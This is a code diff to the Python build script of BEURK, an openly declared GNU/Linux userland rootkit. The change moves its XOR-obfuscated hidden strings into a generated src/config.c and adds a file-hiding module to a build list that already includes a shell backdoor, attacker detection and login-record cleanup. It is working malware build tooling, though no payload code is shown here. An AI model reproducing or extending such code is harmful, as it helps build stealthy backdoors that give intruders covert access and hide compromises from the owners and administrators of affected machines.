@@ -75,6 +75,9 @@ CONFIG_KEYS = {
         "HIDDEN_ENV_VAR": type_str,
         "_UTMP_FILE": type_str,
         "_WTMP_FILE": type_str,
+        "PROC_PATH": type_str,
+        "MAX_LEN": type_int,
+        "ENV_LINE": type_str,
         }
 
 def get_config(lines, check_missing_vars=True):
@@ -156,9 +159,9 @@ for line in header:
 
 
 ###############################################################################
-### generate config.h header file
+### generate includes/config.h and src/config.c
 
-HEADER = """/*
+CONFIG_H = """/*
  * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
  * Copyright (C) 2015  unix-thrust
  *
@@ -185,6 +188,34 @@ HEADER = """/*
 /* common macros from beurk config file*/
 """
 
+CONFIG_C = """/*
+ * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
+ * Copyright (C) 2015  unix-thrust
+ *
+ * This file is part of BEURK.
+ *
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * BEURK is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include "config.h"
+
+ char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
+    %(literals)s
+};
+
+"""
+
+
 
 # add all config vars to header
 # (except for type_str and type_hidden_literal)
@@ -204,7 +235,7 @@ for key, _type in CONFIG_KEYS.items():
         fatal_error("no determined action for %r" %  _type.__name__)
     macros += macro_tpl % {"key": key, "value": value}
 
-HEADER += macros
+CONFIG_H += macros
 
 
 # add hidden literals to config.h
@@ -223,10 +254,7 @@ literals_code = """
 /* store hidden (XORed) literals */
 #define NUM_LITERALS (%(num_literals)d)
 #define MAX_LITERAL_SIZE (%(max_literal_size)d)
-static char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
-    %(literals)s
-};
-
+extern char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE];
 
 /* store real function pointers (hooks fallbacks) */
 #define NUM_HOOKS (%(num_hooks)d)
@@ -267,8 +295,7 @@ for _type, name in function_hooks:
 
 max_literal_size += 1
 
-HEADER += literals_code % {
-        "literals": "\n    ".join(literals),
+CONFIG_H += literals_code % {
         "max_literal_size": max_literal_size + 1,
         "num_literals": num_literals,
         "num_hooks": len(function_hooks),
@@ -276,8 +303,12 @@ HEADER += literals_code % {
         }
 
 
-# write HEADER into config.h
-open("includes/config.h", 'w').write(HEADER)
+CONFIG_C %= {
+        "literals": "\n    ".join(literals),
+        }
+# write CONFIG_H into config.h
+open("includes/config.h", 'w').write(CONFIG_H)
+open("src/config.c", "w").write(CONFIG_C)
 
 
 ###############################################################################
@@ -332,9 +363,11 @@ def run_build_command(cmd):
 
 SOURCES = [
         "src/init.c",
+        "src/config.c",
         "src/drop_shell_backdoor.c",
         "src/is_attacker.c",
         "src/cleanup_login_records.c",
+        "src/is_hidden_file.c",
         ]
 # automagically add every hooks to SOURCES
 SOURCES += glob("src/hooks/*.c")
@@ -373,8 +406,11 @@ else:
 run_build_command("{CC} -fPIC -shared " + set_ld_soname \
         + objects + " {LDFLAGS} -o {LIBRARY_NAME}")
 
-# remove object files afterwards
-run_build_command("rm -f " + objects)
+# remove object files afterwards (keep them if in debug mode
+# in order to be able tu run some tests that need object files
+# to extrapolate on symbols)
+if config["DEBUG_LEVEL"] == 0:
+    run_build_command("rm -f " + objects)
 
 # strip if no debug mode
 if config["DEBUG_LEVEL"] == 0:
